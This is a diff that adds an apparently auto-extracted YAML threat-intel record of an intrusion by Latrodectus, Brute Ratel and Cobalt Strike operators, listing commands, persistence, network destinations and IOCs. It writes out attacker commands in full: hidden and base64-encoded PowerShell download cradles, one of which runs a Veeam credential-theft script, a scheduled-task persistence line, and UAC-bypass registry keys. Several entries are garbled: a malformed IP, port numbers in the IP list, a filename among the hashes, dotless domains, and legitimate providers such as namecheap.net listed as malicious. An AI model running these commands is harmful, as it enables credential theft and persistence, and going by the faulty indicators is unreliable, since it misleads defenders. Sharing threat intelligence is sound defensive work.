@@ -1,0 +1,237 @@
+description: Malicious JavaScript file executed, downloading MSI that installed Brute
+  Ratel and Latrodectus; subsequent deployment of Cobalt Strike, BackConnect, custom
+  .NET backdoor, credential harvesting, lateral movement, exfiltration via rclone/FTP.
+attribution: APT group unknown, possible state-sponsored actor
+malware_families:
+- Brute Ratel
+- Latrodectus
+- Cobalt Strike
+- BackConnect
+- .NET backdoor (lsassa.exe)
+- "Veeam\u2011Get\u2011Creds"
+- AdFind
+- Zero.exe (Zerologon exploit)
+TTPs:
+  processes:
+  - rundll32.exe
+  - explorer.exe
+  - cmd.exe
+  - psexec.exe
+  - gpupdate.exe
+  - spoolsv.exe
+  - siHost.exe
+  - lsassa.exe
+  - wscadminui.dll
+  - rundl32.exe
+  - msiexec.exe
+  commandline:
+  - '''rundll32.exe'' ''wscadminui.dll, wsca'''
+  - '''rundll32.exe'' ''%ALLUSERSPROFILE%\sys.dll,StartUp471'''
+  - '''cmd.exe /K chcp 65001 && c: && cd c:\'''
+  - '''cmd.exe'' ''/c schtasks /create /tn "SchedulerLsass" /tr "%ALLUSERSPROFILE%\USOShared\lsassa.exe"
+    /sc onstart'''
+  - '''powershell -nop -w hidden -c "IEX (New-Object Net.Webclient).DownloadString(''hxxp://127.0.0[.]1:11664/'')"'''
+  - C:\\Windows\\System32\\rund1132.exe" C:\\Users\\[\\apppata\\Roaming\\upfilles.dll,
+    stow
+  - '"C:\\programdata\\run.bat"'
+  powershell:
+  - powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADQAMAAwADMALwAnACkAOwAgAFYAZQBlAGEAbQAtAEcAZQB0AC0AQwByAGUAZABzAC4AcABzADEA
+  scripting_engine:
+  - wscript.exe
+  registry_keys:
+  - HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command
+  - HKCU\\Software\\Classes\\ms-settings\\shell\\DelegateExecute
+  image_load: []
+  network_connections:
+  - process: Latrodectus
+    destination: 193.168.143[.]196
+    port: ''
+  - process: Cobalt Strike beacon
+    destination: 45.129.199[.]214
+    port: ''
+  - process: Cobalt Strike stager
+    destination: 206.206.123[.]209
+    port: 443
+  - process: rundl32.exe
+    destination: grasmertal.com
+    port: 443
+  - process: rundl32.exe
+    destination: workspacin.cloud
+    port: 443
+  - process: rundl32.exe
+    destination: illoskanawer.com
+    port: 443
+  - process: rundl32.exe
+    destination: grasmetral.com
+    port: 443
+  - process: rundl32.exe
+    destination: jarkaairbo.com
+    port: 443
+  - process: rundl32.exe
+    destination: scupolasta.store
+    port: 443
+  - process: rundl32.exe
+    destination: msi-second-stage.com
+    port: 443
+  - process: rundl32.exe
+    destination: tangram-canada-inc.com
+    port: 443
+  - process: rundl32.exe
+    destination: zergrush-srl.com
+    port: 443
+  - process: rundl32.exe
+    destination: anikvan.com
+    port: 443
+  - process: rundl32.exe
+    destination: pq-hosting-plus.s.r.l.
+    port: 443
+  - process: rundl32.exe
+    destination: erbolsan.com
+    port: 443
+  - process: rundl32.exe
+    destination: samderat200.com
+    port: 443
+  - process: rundl32.exe
+    destination: dauled.com
+    port: 443
+  - process: rundl32.exe
+    destination: cloudmeri.com
+    port: 443
+  - process: rundl32.exe
+    destination: namecheap.net
+    port: 4444
+  - process: rundl32.exe
+    destination: aeza-international-ltd.de
+    port: 443
+  - process: rundl32.exe
+    destination: avtechupdate.com
+    port: 443
+  - process: rundl32.exe
+    destination: datacamplimited.us
+    port: 80
+  - process: rundl32.exe
+    destination: bluevps.io
+    port: 80
+  - process: rundl32.exe
+    destination: asnet.bg
+    port: 80
+  - executable: ''
+    destination_address: 45.135.232.3
+    port: ''
+    protocol: ''
+  - executable: ''
+    destination_address: 172.67213.171
+    port: '443'
+    protocol: https
+  - executable: ''
+    destination_address: 173.255.204.62
+    port: '443'
+    protocol: https
+  file_activity:
+  - C:\\ProgramData\\cron801.dl_
+  - C:\\ProgramData\\system.dl_
+  - C:\\Windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe
+  - C:\\Users\\Admin\\AppData\\Roaming\\upfilles.dll
+  - C:\\programdata\\run.bat
+  persistence:
+  - 'Registry Run key: Update -> wscadminui.dll'
+  - Scheduled task SchedulerLsass created by lsassa.exe
+  process_relations:
+  - parent: explorer.exe
+    child: rundl32.exe
+IOCs:
+  hashes:
+  - 8de22d886a74c501a33aa08dcb9be2f222fa6e24
+  - c356468.exe
+  - A2B6479A69B51AE555F695B243E4FDA1
+  - 23FFF588E3E5CC6678E1F77FAB9318D60F3AC55F
+  - 8FB5034AEDF41F8C8C4C4022FDDE7DB3C70A5A7C7B5B4DEC7F6A57715C18A5BF
+  ips:
+  - 193.168.143[.]196
+  - 45.129.199[.]214
+  - 206.206.123[.]209
+  - 45.129.199.214
+  - 45.135.232.3
+  - 185.93.221.121
+  - 162.0.209.121
+  - 95.164.68.73
+  - 38.124.183.215
+  - 91.194.11.64
+  - 104.21.16.155
+  - 172.67.213.171
+  - 104.21.52.10
+  - 172.67.193.233
+  - 172.67.172.177
+  - 104.21.30.90
+  - 172.67.174.176
+  - 104.21.88.89
+  - 193.168.143.196
+  - 185.93.221.124
+  - 138.124.183.215
+  - 91.194.11.183
+  - 54.165.22.33
+  - 35.153.92.249
+  - 34.233.204.207
+  - 54.159.36.188
+  - 35.172.8.165
+  - 54.175.181.104
+  - 3.72.42.242
+  - 3.69.236.35
+  - 35.157.36.116
+  - 3.66.241.8
+  - 3.124.114.34
+  - 3.69.194.165
+  - 94.232.249.100
+  - 94.131.108.254
+  - 45.150.65.85
+  - 195.123.225.161
+  - 195.211.98.249
+  - 195.123.225.251
+  - 217.196.98.61
+  - 206.206.123.209
+  - 80
+  - 8080
+  - 172.67213.171
+  - 173.255.204.62
+  domains:
+  - cloudmeri.com
+  - workspacin.cloud
+  - illoskanawer.com
+  - grasmetral.com
+  - jarkaairbo.com
+  - scupolasta.store
+  - grasmertal.com
+  - shocks-1.ro
+  - iloskanawer.com
+  - msi-second-stage.com
+  - tangram-canada-inc.com
+  - zergrush-srl.com
+  - anikvan.com
+  - pq-hosting-plus.s.r.l.
+  - erbolsan.com
+  - samderat200.com
+  - dauled.com
+  - namecheap.net
+  - aeza-international-ltd.de
+  - avtechupdate.com
+  - datacamplimited.us
+  - bluevps.io
+  - asnet.bg
+  - scupolastastore
+  - cobaltstrike.com
+  - anikvancom
+  - altynbe.com
+  - boriz400.com
+  - ridiculous-breakpoint-gwaws-uselcloud-aratykio
+  - uncertain-kitten-gwaws-eucl cloud-aratykio
+  - erbolsancom
+  urls:
+  - hxxps://workspacin.cloud/live/
+  - hxxps://illoskanawer.com/live/
+authors:
+- '@RussianPanda9xx'
+- Christos Fotopoulos
+- Salem Salem
+reference: https://thedfirreport.com/2025/09/29/from-a-single-click-how-lunar-spider-enabled-a-near-two-month-intrusion
+date_of_publication: September 29, 2025
+file_creation_date: October 09, 2025
